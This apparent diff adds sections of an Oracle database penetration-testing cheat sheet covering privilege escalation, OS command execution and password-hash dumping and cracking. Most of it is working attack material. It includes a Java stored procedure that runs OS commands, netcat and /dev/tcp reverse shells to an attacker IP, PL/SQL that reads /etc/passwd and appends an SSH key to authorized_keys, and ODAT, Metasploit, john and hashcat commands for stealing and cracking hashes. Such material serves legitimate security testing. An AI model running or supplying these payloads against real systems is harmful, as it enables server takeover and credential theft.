+09.7. OS and DB Privesc - Check for accounts with the "JAVASYSPRIV" role 
+====================================================================================================
+If JAVA is installed and enabled in an ORACLE database then any accounts with the "JAVASYSPRIV" role (and ideally also the privilege "CREATE PROCEDURE") can escalate its privileges and take over the OS server and the ORACLE database.
+
+The same attack can be done if a user can exec the DBMS_JAVA package/stored procedure (since it can run 'any' java code, write and read in file...). Refer to next section.
+
+* Manual checks:
+----------------
+	SQL> select comp_name, version from dba_registry where comp_name like '%JAVA%'
+	SQL> SELECT * FROM dba_role_privs WHERE GRANTED_ROLE = 'JAVASYSPRIV' or GRANTED_ROLE ='JAVA_ADMIN' or GRANTED_ROLE ='JAVADEBUGPRIV';
+
+
+* Manual attack: SQL queries and Oracle PL/SQL script to execute remote OS Commands using the "JAVASYSPRIV" role
+-----------------------------------------------------------------------------------------------------------------
+  STEP 1: Launch a listener for your reverse shell using netcat
+  	  pentester@LinuxVM > nc -l -p 4444
+		
+  STEP 2: Launch SQLplus, connect to the DB and then execute the following queries...
+        pentester@LinuxVM > sqlplus64 /nolog
+		SQL> CONNECT user/password@192.168.1.10/ORCL;
+		SQL> @JAVA_OS_CMD_EXEC.sql
+		SQL> exec javacmdproc('/bin/nc -e /bin/bash 192.168.1.19 4444');
+
+		IF the target server is a Windows server, the follwing queries can be used to execute remote OS commands:
+		SQL> exec javacmdproc('cmd.exe /c echo 0wned > c:\CMD_Results.txt');
+
+  Code of the PL/SQL script "@JAVA_OS_CMD_EXEC.sql"
+		create or replace and compile java source named "JAVACMD" AS
+		import java.lang.*;
+		import java.io.*;
+		public class JAVACMD
+		{
+		 public static void execCommand (String command) throws IOException {
+		     Runtime.getRuntime().exec(command);} };
+		/
+		Create or replace procedure javacmdproc (p_command  in  varchar2)
+		as language java 
+		name 'JAVACMD.execCommand (java.lang.String)';
+		/
+
+  STEP 3: The reverse shell is up and running with the privileges of the OS account ORACLE who is DBA of the database
+  	  pentester@LinuxVM > nc -l -p 4444
+	        > /bin/id
+                ...uid=1000(oracle) gid=54321(oinstall) groups=54321(oinstall),10(wheel),983(vboxsf),54322(dba)..
+		> /u01/app/oracle/product/12.2/db_1/bin/sqlplus sys as sysdba
+		...CONNECTED...
+		   SQL> SHOW USER;
+			...SYS...
+			
+  STEP 4: Drop the procedure 'javacmdproc'
+		SQL> DROP PROCEDURE SCOTT.javacmdproc;
+
+* Automatic attack with ODAT - 'JAVA' module:
+---------------------------------------------
+	pentester@LinuxVM > ./odat.py java -s 192.168.1.136 -d SID -U user -P password --reverse-shell
+
+
+
+09.8. OS Privesc - Check for accounts which can execute sensitive stored procedures (UTL_* and DBMS_*) 
+======================================================================================================
+Users who can execute sensitive stored procedures (e.g. UTL and DBMS) can most of the time compromise the OS server underlying the database by downloading and uploading arbitrary files on the OS and/or executing arbitray binaries on the OS.
+Unfortunately very often the role PUBLIC (i.e. all db accounts) has by default the right to execute numerous sensitive stored procedures.
+
+
+* Manual checks:
+----------------
+SQL> SELECT * FROM dba_tab_privs WHERE table_name='UTL_FILE' OR table_name='UTL_HTTP' OR table_name='DBMS_JAVA' OR table_name='DBMS_JOB' OR table_name='DBMS_SCHEDULER' OR table_name='DBMS_ADVISOR' OR table_name='DBMS_XSLPROCESSOR' OR table_name='DBMS_LOB';
+
+
+
+* Manual attack I - SQL queries and PL/SQL script to read a file (e.g. '/etc/passwd') using "UTL_FILE"
+--------------------------------------------------------------------------------------------------------
+  pentester@LinuxVM > sqlplus64 /nolog
+		 SQL> CONNECT user/password@192.168.1.10/ORCL;
+		 SQL> @UTL_FILE_READ_OS_FILE.sql
+		 SQL> DROP DIRECTORY MYDIR ;
+
+  Code of the PL/SQL script "UTL_FILE_READ_OS_FILE.sql":
+		set serveroutput on size 1000000;
+		CREATE OR REPLACE DIRECTORY MYDIR AS '/etc/' ;
+		GRANT READ, WRITE ON DIRECTORY MYDIR TO PUBLIC ;
+		DECLARE
+		l_fileID UTL_FILE.FILE_TYPE;
+		l_buffer VARCHAR2(32000);
+		hexdata VARCHAR2(32000);
+		BEGIN
+		l_fileID := UTL_FILE.FOPEN ('MYDIR', 'passwd', 'r', 16000); LOOP
+		UTL_FILE.GET_LINE(l_fileID, l_buffer, 16000);
+		dbms_output.put_line(l_buffer);
+		END LOOP;
+		EXCEPTION WHEN NO_DATA_FOUND THEN UTL_FILE.fclose(l_fileID);
+		NULL;
+		END;
+		/
+
+* Manual attack II - SQL queries and PL/SQL script to upload/edit a file (e.g. 'authorized_keys') using "UTL_FILE"
+---------------------------------------------------------------------------------------------------------------
+  pentester@LinuxVM > sqlplus64 /nolog
+		 SQL> CONNECT user/password@192.168.1.10/ORCL;
+		 SQL> @UTL_FILE_WRITE_OS_FILE.sql
+		 SQL> DROP DIRECTORY MYDIR ;
+
+  Code of the PL/SQL script "UTL_FILE_WRITE_OS_FILE.sql"
+		set serveroutput on
+		CREATE OR REPLACE DIRECTORY MYDIR AS '/home/oracle/.ssh/' ;
+		GRANT READ, WRITE ON DIRECTORY MYDIR TO PUBLIC ;
+		DECLARE
+		f_file_id UTL_FILE.FILE_TYPE;
+		v_file_location VARCHAR2(256) := 'MYDIR';
+		v_line VARCHAR2(4000);
+		BEGIN
+		 dbms_output.put_line(v_file_location);
+		 f_file_id := UTL_FILE.FOPEN(v_file_location,'authorized_keys','a');
+		 UTL_FILE.PUT_LINE(f_file_id,'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/7UrjWdRfjjkB0y6jDlCOK7JEbsbkLb10Op0Slx61oHgxx4HbnMLfToJOD30JlZavz+ZZ+Pb/1XNyUOIumKpgdUo2Qcyw6In3nrqqy2KJ1CDm6n3rM/FElJVIeZMUXi14pt3PcPU5pAVwKfnT6rGHRYIgP58tIn2aoaa7pOF6FwHPp6Hb01aeB0PkXT/enX1qs/eKwXH3T/m6nGPcqxMoUKu89lYuAQDRUY8ckqxynoNV9lUxOkTqbCaE2rzTah6pNMvkJ/ZfzwF0sjSKxeiNcRl2kWea+x8uBSGah/1+yieoDAq4dfIO+azNpUlbc1F+bAxL/2OrNAJvM4RWxoCp pentester@pentester-VirtualBox');
+		 UTL_FILE.FCLOSE (f_file_id);
+		 f_file_id := UTL_FILE.FOPEN(v_file_location,'authorized_keys','r');
+		 UTL_FILE.GET_LINE(f_file_id,v_line);
+		 DBMS_OUTPUT.PUT_LINE(v_line);
+		 UTL_FILE.FCLOSE (f_file_id);
+		EXCEPTION
+		 WHEN OTHERS
+		THEN
+		 dbms_output.put_line(SQLERRM);
+		 UTL_FILE.FCLOSE_ALL;
+		END;
+		/
+
+
+* Manual attack III - SQL queries and PL/SQL script to upload a file (e.g. 'shell1.sh') using "Dbms_XslProcessor"
+-----------------------------------------------------------------------------------------------------------------
+  pentester@LinuxVM > sqlplus64 /nolog
+		 SQL> CONNECT username1/password@192.168.1.10/ORCL;
+		 SQL> CREATE OR REPLACE DIRECTORY MYDIR AS '/tmp/';
+		 SQL> EXEC dbms_xslprocessor.clob2file ('bash -i >$ /dev/tcp/192.168.1.199/4444 0>$1','MYDIR','shell1.sh');
+		 SQL> DROP DIRECTORY MYDIR;
+
+
+  Important note: 
+	If the objective is to upload a file (e.g. reverse shell, scripts) that will be executed later on using another attack, then the  current user (username1 in this example) must have the privilege 'EXECUTE ON DIRECTORY' on the directory 'MYDIR'. 
+	To verify that the current user has access to the directory 'MYDIR' with execute privilege you can run the following SQL query (MYDIR should be included in the result of the request)
+
+		SQL> SELECT TABLE_NAME FROM ALL_TAB_PRIVS WHERE TABLE_NAME IN (SELECT OBJECT_NAME FROM ALL_OBJECTS WHERE OBJECT_TYPE='DIRECTORY') and privilege='EXECUTE' ORDER BY GRANTEE;
+
+	If the current user doesn't have this privilege, it can be granted with a dba user by running the following SQL query:
+  	pentester@LinuxVM > sqlplus64 /nolog
+		 SQL> CONNECT sys/password@192.168.1.10:1521/ORCL as sysdba;
+		 SQL> GRANT READ, WRITE, EXECUTE ON DIRECTORY MYDIR TO username1;
+
+
+
+* Manual attack IV - SQL queries and PL/SQL script to upload a file (e.g. 'shell2.sh') using "DBMS_ADVISOR"
+-----------------------------------------------------------------------------------------------------------
+  pentester@LinuxVM > sqlplus64 /nolog
+		 SQL> CONNECT username1/password@192.168.1.10/ORCL;
+		 SQL> CREATE OR REPLACE DIRECTORY MYDIR AS '/tmp/';
+		 SQL> EXEC dbms_advisor.create_file ('bash -i >$ /dev/tcp/192.168.1.199/4444 0>$1','MYDIR','shell2.sh');
+		 SQL> DROP DIRECTORY MYDIR;
+
+  Important note: 
+	If the objective is to upload a file (e.g. reverse shell, scripts) that will be executed later on using another attack, then the  current user (username1 in this example) must have the privilege 'EXECUTE ON DIRECTORY' on the directory 'MYDIR'. 
+	To verify that the current user has access to the directory 'MYDIR' with execute privilege you can run the following SQL query (MYDIR should be included in the result of the request)
+
+		SQL> SELECT TABLE_NAME FROM ALL_TAB_PRIVS WHERE TABLE_NAME IN (SELECT OBJECT_NAME FROM ALL_OBJECTS WHERE OBJECT_TYPE='DIRECTORY') and privilege='EXECUTE' ORDER BY GRANTEE;
+
+	If the current user doesn't have this privilege, it can be granted with a dba user by running the following SQL query:
+  	pentester@LinuxVM > sqlplus64 /nolog
+		 SQL> CONNECT sys/password@192.168.1.10:1521/ORCL as sysdba;
+		 SQL> GRANT READ, WRITE, EXECUTE ON DIRECTORY MYDIR TO username1;
+
+
+
+* Manual attack V - SQL queries and PL/SQL script to execute a reverse shell already uploaded on the OS hosting the DB with the permissions "DBMS_SCHEDULER" and "CREATE JOB" or "CREATE EXTERNAL JOB"
+-----------------------------------------------------------------------------------------------------------------------------
+
+Requirements: to perform the attack described below, the current db user must have the 'CREATE EXTERNAL JOB' privilege.
+
+  STEP 1: Launch a listener for your reverse shell:
+  	pentester@LinuxVM > nc -l -v 192.168.1.199 1234
+		
+  STEP 2: Launch SQLplus, connect to the DB and then create a program and execute it using DBMS_SCHEDULER:
+  	pentester@LinuxVM > sqlplus64 /nolog
+		 SQL> CONNECT user/password@192.168.1.10/ORCL;
+		 SQL> @DBMS_SCHEDULER_PROGRAM.sql
+		 SQL> @DBMS_SCHEDULER_JOB.sql
+		 SQL> exec DBMS_SCHEDULER.drop_program('Testshell');
+
+  Code of the PL/SQL script "DBMS_SCHEDULER_PROGRAM.sql" 
+		BEGIN
+		DBMS_SCHEDULER.create_program
+		(
+		program_name => 'Testshell',
+		program_type => 'EXECUTABLE',
+		program_action => '/tmp/reverseshell.sh',
+		number_of_arguments => 0,
+		enabled => TRUE,
+		comments => 'OWNED..'
+		);
+		END;
+		/
+
+  Code of the PL/SQL script "DBMS_SCHEDULER_JOB.sql" 
+		BEGIN
+		DBMS_SCHEDULER.create_job ( 
+		JOB_NAME => 'TestJob', 
+		program_name => 'Testshell',
+		start_date => NULL, 
+		repeat_interval => NULL,
+		end_date => NULL, 
+		enabled => TRUE, 
+		auto_drop => TRUE
+		);
+		END;
+		/
+
+
+
+* Manual attack VI - Perform HTTP requests or a simple network ports scan (from the DB) using 'UTL_HTTP' or 'httpuritype'
+--------------------------------------------------------------------------------------------------------------------------
+	pentester@LinuxVM > sqlplus64 /nolog
+		SQL> CONNECT user/password@192.168.1.10/ORCL;
+		SQL> SELECT utl_http.request('www.google.com') AS data FROM dual;
+		OR
+		SQL> SELECT httpuritype('http://www.google.com').getclob() FROM dual;
+
+
+* Automatic attacks with ODAT I - Execute remote OS commands using "dbmsscheduler" or "ORADBG" (debuguer)
+----------------------------------------------------------------------------------------------------------
+	pentester@LinuxVM > ./odat.py dbmsscheduler -s $SERVER -d $SID -U $USER -P $PASSWORD --reverse-shell $MY_IP $A_LOCAL_PORT
+	pentester@LinuxVM > ./odat.py oradbg -s $SERVER -d $SID -U $USER -P $PASSWORD --exec /bin/ls
+
+
+
+* Automatic attacks with ODAT II- Upload file on the OS server hosting the Database using "UTL_FILE" or "DBMSXSLPROCESSOR" 
+---------------------------------------------------------------------------------------------------------------------------
+	pentester@LinuxVM > ./odat.py dbmsxslprocessor -s $SERVER -d $SID -U $USER -P $PASSWORD --putFile /tmp/ file.txt test.txt
+	pentester@LinuxVM > ./odat.py utlfile -s 192.168.1.136 -d ORCL -U scott -P tiger --test-module --putFile /tmp/ file.txt test.txt
+
+
+* Automatic attacks with ODAT III - Download OS file using "DBMSLOB", "CTXSYS", "UTL_FILE"
+--------------------------------------------------------------------------------------------
+	pentester@LinuxVM > ./odat.py dbmslob -s $SERVER -d $SID -U $USER -P $PASSWORD --getFile '/etc/' 'passwd' 'temp.txt'
+	pentester@LinuxVM > ./odat.py ctxsys -s $SERVER -d $SID -U $USER -P $PASSWORD --getFile /etc/passwd
+	pentester@LinuxVM > ./odat.py utlfile -s 192.168.1.136 -d ORCL -U scott -P tiger --test-module --getFile /etc/ passwd passwd.txt
+
+
+
+09.9. OS Privesc - Execute a script or Read a file stored on the OS supporting the Oracle database using "External tables"
+==========================================================================================================================
+External Tables allow to query data in a flat file stored on the OS supporting the database as though the file were an Oracle table.
+It can also be used to execute scripts on the OS supporting the database.
+
+Requirements: to perform the attack described below, the current db user must have the 'CREATE TABLE' and 'CREATE ANY DIRECTORY' privileges.
+
+* Manual attack - How to read a file (e.g. /u01/userhome/oracle/.bash_history) stored on the OS supporting the database:
+------------------------------------------------------------------------------------------------------------------------
+  	pentester@LinuxVM > sqlplus64 /nolog
+		SQL> CONNECT scott/tiger@192.168.1.10:1521/ORCL;
+		SQL> CREATE or REPLACE DIRECTORY PREPROCESSOR_DIRECTORY AS '/u01/userhome/oracle/';
+		SQL> @/home/pentester/Documents/Privesc/EXTERNAL_TABLES_READ_OS_FILE.sql
+		SQL> SELECT * from EXTT;		//Display the file 
+		SQL> DROP TABLE EXTT;
+		SQL> DROP DIRECTORY PREPROCESSOR_DIRECTORY;
+
+
+  	Code of the PL/SQL script "EXTERNAL_TABLES_READ_OS_FILE.sql" 
+		CREATE TABLE EXTT (line varchar2(256))
+		ORGANIZATION EXTERNAL
+		(TYPE oracle_loader
+		  DEFAULT DIRECTORY PREPROCESSOR_DIRECTORY
+		  ACCESS PARAMETERS
+		  ( RECORDS DELIMITED BY NEWLINE
+		    FIELDS TERMINATED BY ',')
+		  LOCATION (PREPROCESSOR_DIRECTORY:'.bash_history'))
+		/
+
+
+* Automatic attack with ODAT - 'externaltable' module:
+-----------------------------------------------------
+	pentester@LinuxVM > ./odat.py externaltable -s $SERVER -d $SID -U $USER -P $PASSWORD --exec /tmp/ temp.sh	
+	pentester@LinuxVM > ./odat.py externaltable -s 192.168.1.9 -d SID -U username -P password --exec "C:/windows/system32" "calc.exe"
+	pentester@LinuxVM > ./odat.py externaltable -s 192.168.1.9 -d SID -U username -P password --getFile /tmp/ temp.sh test.txt
+
+
+
+09.10. DB Privesc - Check for "REMOTE OS AUTHENT" and "EXTERNAL USERS" (OPS$) to bypass the DB authentication and connect with no pwd
+======================================================================================================================================
+The insecure authentication mode "REMOTE_OS_AUTHENT" is often enabled and used in SAP environment. 
+This configuration weakness can be used to bypass the DB authentication and log into the DB with just the login of an external user (ops$ user) and with no pwd.
+
+* Manual checks:
+----------------
+	SQL> SELECT * FROM v$parameter WHERE name='remote_os_roles' OR name='remote_os_authent' OR name='os_authent_prefix' OR	name='ldap_directory_access' OR name='ldap_directory_sysauth';
+	SQL> SELECT username, password FROM dba_users WHERE password='EXTERNAL';
+	SQL> SHOW parameter os_remote_prefix;
+	SQL> SHOW parameter os_remote_authent;
+
+* Manual attack:
+----------------
+	If there is an external user named "ops$new_account" then...
+	pentester@LinuxVM > adduser new_account
+	pentester@LinuxVM > su new_account
+	new_account@LinuxVM > sqlplus64 /@192.168.1.136:1521/ORCL
+	> Connected
+	SQL> SHOW USER;
+	> ops$new_account
+
+
+09.11. DB Privesc - Check for Database links (DB_LINKS) - Attacking a Database through another database
+=======================================================================================================
+Database links (DB_LINKS) can be exploited to attacking databases through another database.
+
+* Notes:
+	+ A database link allows one or several db users to access objects stored on a remote database. 
+	+ A DB link can be PRIVATE (i.e. only 1 db user can use it) or PUBLIC (i.e. all db users can use it).
+	+ There are several useful tables to check:
+		+ ALL_DB_LINKS : All DB links the current user has access to
+		+ USER_DB_LINKS: All DB links owned by current user
+		+ DBA_DB_LINKS : All DB links defined in the database
+
+* Manual checks:
+----------------
+	SQL> SELECT db_link, username, host FROM ALL_DB_LINKS;
+	SQL> SELECT * FROM USER_DB_LINKS
+	SQL> SELECT * FROM DBA_DB_LINKS	 
+
+* Manual attack - How to exploit a PUBLIC DB LINK:
+--------------------------------------------------
+	Example: A public DB LINK named 'salesDbLink' has been created in the Oracle database 'accounting-db.company.com' to connect to the remote Oracle database 'sales-db.company.com' (as the db user account "salesman") using the following command.
+	SQL> CREATE PUBLIC DATABASE LINK sales-db.company.com CONNECT TO salesman IDENTIFIED BY salesman_password USING 'salesDbLink'
+
+	Then if you are connected to the database 'accounting-db.company.com' you can access/copy data stored in tables (belonging to the user "salesman") on the remote Database 'sales-db.company.com' using the following command: 
+	SQL> SELECT * FROM table_name@salesDbLink;
+	OR
+	SQL> INSERT INTO local_table SELECT * FROM table_name@salesDbLink;
+
+
+09.12. Capture SMB authentication using ODAT / METASPLOIT
+===========================================================
+This module allows to capture a SMB authentication challenge-response password hashes of SMB client systems. 
+
+Prerequisite in order to capture a challenge:
+- Oracle Database must be installed on Windows. 
+- Oracle Database services must not used a Windows network service account, a system account or a local service account.
+
+Notice: To use this module, a tool to capture SMB authentication must be used (e.g. metasploit or responder).
+
+Step 1: use the auxiliary/server/capture/smb metasploit module to capture the SMB authentication.
+-------------------------------------------------------------------------------------------------
+pentester@LinuxVM > msfconsole
+	msf > 	msfconsole
+	[...]
+	msf auxiliary(smb) > use auxiliary/server/capture/smb	
+	msf auxiliary(smb) > run
+	
+Step 2. Use the '--capture' command of ODAT to force the Oracle Database server to connect to the 'malicious' smb server started with metasploit 
+-------------------------------------------------------------------------------------------------------------------------------------------------
+pentester@LinuxVM > ./odat.py smb -s $SERVER -d $SID -U $USER -P $PASSWORD --capture $MY-IP-ADDRESS SHARE-NAME
+
+Step 3. Crack the SMB authentication challenge-response password hashes (NTLM).
+-------------------------------------------------------------------------------
+pentester@LinuxVM > ./john –format:netlm /tmp/capture.txt
+
+
+
+============================================================================================================================
+10. How to dump and crack Oracle password hashes (10g, 11g, 12c)
+============================================================================================================================
+
+1. Manual Password Hashs dump 
+=============================
+
+1. Log into the Database with an account who has "sysdba" privileges
+   SQL> sqlplus dba_account/dba_account_password@192.168.1.136:1521/ORCL as sysdba;
+	
+2. Dump the hashs
+   SQL> SELECT name, password, spare4 FROM sys.user$; 
+
+	+ Column 'password' 
+		> DES based password used from Oracle 6 until 10g
+		> Password is not case sensitive
+
+	+ Column 'spare4'
+		> "S" value:
+			+ SHA1 password hash introduced on Oracle 11g
+			+ Password is case sensitive
+			+ Example: "S:FDBB56DB00B2E3F1B2D2F9BFC4BFF2B5DF0B8704378EB24E7CB7D9C20716"
+		> "T" value:
+			+ Oracle 12c password hash (PBKDF2 and SHA512 based)
+			+ Password is case senstive and hash is salted
+			+ Example: "T:D16A0577EA9A81267B2FE4535974D0ED1D450E12A1D47D82F98930935FCC9CFA79DCC93FDCCCD3AEB6F8F<SNIP>"
+		> "H" value:
+			+ HTTP Digest password hash introduced on Oracle 12.1.0.1
+			+ Example: "H:63EC639D32F2C215B68C56321EE236FE"
+			
+
+2. Automatic Oracle Password Hashs dump 
+=======================================
+
+ODAT - 'passwordstealer' module
+-------------------------------
+* To get hashed passwords from the users table:
+pentester@LinuxVM > ./odat.py passwordstealer -s $SERVER -d $SID -U $USER -P $PASSWORD --get-passwords
+
+* To get hashed passwords from the history:
+pentester@LinuxVM > ./odat.py passwordstealer -s $SERVER -d $SID -U $USER -P $PASSWORD --get-passwords-from-history
+
+
+METASPLOIT - 'oracle_hashdump' module
+-------------------------------------
+This module dumps the usernames and password hashes from Oracle given the proper Credentials and SID. These are then stored as creds for later cracking.
+
+pentester@LinuxVM > msfconsole
+msf > use auxiliary/scanner/oracle/oracle_hashdump
+      msf auxiliary(oracle_hashdump) > show actions
+            ...actions...
+      msf auxiliary(oracle_hashdump) > set ACTION <action-name>
+      msf auxiliary(oracle_hashdump) > show options
+            ...show and set options...
+      msf auxiliary(oracle_hashdump) > run
+    
+
+3. Oracle 11g/10g Password Hashs Cracking  
+=========================================
+
+JOHN the RIPPER - Jumbo Version (www.openwall.com)
+--------------------------------------------------
+
+• Cracking Oracle 11G password hashs:
+  pentester@LinuxVM > cd /home/pentester/Documents/john-1.8.0-jumbo-1/run
+  pentester@LinuxVM > john --format=oracle11 password_dump_file.txt
+  pentester@LinuxVM > john --show password_dump_file.txt
+
+• Note: 
+  + format to give to John (if login=username and hash="S:FDBB56DB00B2E3F1B2D2F9BFC4BFF2B5DF0B8704378EB24E7CB7D9C20716"):
+  username:FDBB56DB00B2E3F1B2D2F9BFC4BFF2B5DF0B8704378EB24E7CB7D9C20716
+
+
+• Cracking 10g password hashs:
+  pentester@LinuxVM > cd /home/pentester/Documents/john-1.8.0-jumbo-1/run
+  pentester@LinuxVM > ./john --format=oracle password_dump_file.txt
+  pentester@LinuxVM > ./john --show password_dump_file.txt
+
+
+HASHCAT and OCL-HASHCAT - Https://hashcat.net
+---------------------------------------------
+
+• Cracking Oracle 11G password hashs:
+  If 'S:FDBB56DB00B2E3F1B2D2F9BFC4BFF2B5DF0B8704378EB24E7CB7D9C20716'
+  Then this means:
+  HASH = 'FDBB56DB00B2E3F1B2D2F9BFC4BFF2B5DF0B8704'
+  SALT = '378EB24E7CB7D9C20716'
+
+  pentester@LinuxVM > echo FDBB56DB00B2E3F1B2D2F9BFC4BFF2B5DF0B8704:378EB24E7CB7D9C20716 >test
+  pentester@LinuxVM > ./hashcat-cli64.bin -m 110 --hex-salt test -a 3 ?l?l?l
+
+  pentester@LinuxVM > ./oclHashcat-plus64.bin -m 110 --hex-salt FDBB56DB00B2E3F1B2D2F9BFC4BFF2B5DF0B8704:378EB24E7CB7D9C20716 -a 3 ?l?l?l
+
+
+• Cracking Oracle 12C password Hashs (to check)
+  hash type = 12300			
+  T:9587674D5FAD2829B14DE5F463B0E57806F89B183DED5F1F2E60516525CEDCCE53AE2CAE0B0EE6CD746549BC8167C5853349B85639AA963B
+  EFD7E6E911E796B8E24CEAF86D3F62CF5BBA31BAF8F954FB
+
+  pentester@LinuxVM > ./hashcat-cli64.bin -m 12300 <HASH> -a 3 ?l?l?l
